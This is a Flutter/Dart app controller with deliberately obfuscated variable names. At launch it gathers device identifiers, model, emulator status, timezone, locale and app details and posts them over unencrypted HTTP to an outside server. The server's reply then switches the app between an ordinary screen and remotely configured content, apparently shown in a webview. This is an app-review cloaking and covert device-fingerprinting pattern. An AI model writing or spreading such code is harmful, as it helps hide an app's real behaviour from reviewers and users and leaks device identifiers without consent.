import 'dart:convert';
import 'dart:io';

import 'package:connectivity_plus/connectivity_plus.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

void checkNetwork() async {
  var connectResult = await (Connectivity().checkConnectivity());
  if(connectResult == ConnectivityResult.none){
    Get.toNamed("/noNetwork");
  }
}

class PageLogic extends GetxController {

  var pnugid = RxBool(false);
  var hygukzo = RxBool(true);
  var vwqxp = RxString("");
  var ben = RxBool(false);
  var kilback = RxBool(true);
  final wueipxa = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    checkNetwork();
    super.onInit();
    nwcjhpiv();
  }


  Future<void> nwcjhpiv() async {

    ben.value = true;
    kilback.value = true;
    hygukzo.value = false;

    wueipxa.post("http://tet.stampin.life/rckquxghimajtb",data: await lovyrkeq()).then((value) {
      var jitv = value.data["jitv"] as String;
      var onlik = value.data["onlik"] as bool;
      if (onlik) {
        vwqxp.value = jitv;
        pearlie();
      } else {
        satterfield();
      }
    }).catchError((e) {
      hygukzo.value = true;
      kilback.value = true;
      ben.value = false;
    });
  }

  Future<Map<String, dynamic>> lovyrkeq() async {
    final DeviceInfoPlugin iaswzjxn = DeviceInfoPlugin();
    PackageInfo zqam_tpariz = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var uojwhz = Platform.localeName;
    var cuqz = currentTimeZone;

    var eohxlmnz = zqam_tpariz.packageName;
    var pxlobqz = zqam_tpariz.version;
    var yjhpcbma = zqam_tpariz.buildNumber;

    var dcitl = zqam_tpariz.appName;
    var gfaij = "";
    var mhgnbfwx  = "";
    var yvpj = "";
    var julianaSchowalter = "";
    var hershelCronin = "";
    var amosGreenholt = "";
    var gabeJohnston = "";
    var charlieHaag = "";


    var carolDurgan = "";
    var qtjafkcz = "";
    var gytaqjo = false;

    if (GetPlatform.isAndroid) {
      qtjafkcz = "android";
      var rwoxiludva = await iaswzjxn.androidInfo;

      yvpj = rwoxiludva.brand;

      gfaij  = rwoxiludva.model;
      mhgnbfwx = rwoxiludva.id;

      gytaqjo = rwoxiludva.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      qtjafkcz = "ios";
      var bosgenhj = await iaswzjxn.iosInfo;
      yvpj = bosgenhj.name;
      gfaij = bosgenhj.model;

      mhgnbfwx = bosgenhj.identifierForVendor ?? "";
      gytaqjo  = bosgenhj.isPhysicalDevice;
    }
    var res = {
      "eohxlmnz": eohxlmnz,
      "dcitl": dcitl,
      "yjhpcbma": yjhpcbma,
      "cuqz": cuqz,
      "yvpj": yvpj,
      "charlieHaag" : charlieHaag,
      "julianaSchowalter" : julianaSchowalter,
      "mhgnbfwx": mhgnbfwx,
      "uojwhz": uojwhz,
      "qtjafkcz": qtjafkcz,
      "gytaqjo": gytaqjo,
      "pxlobqz": pxlobqz,
      "gfaij": gfaij,
      "amosGreenholt" : amosGreenholt,
      "carolDurgan" : carolDurgan,
      "gabeJohnston" : gabeJohnston,
      "hershelCronin" : hershelCronin,

    };
    return res;
  }

  Future<void> satterfield() async {
    Get.offAllNamed("/keepMain");
  }

  Future<void> pearlie() async {
    Get.offAllNamed("/configInit");
  }

}
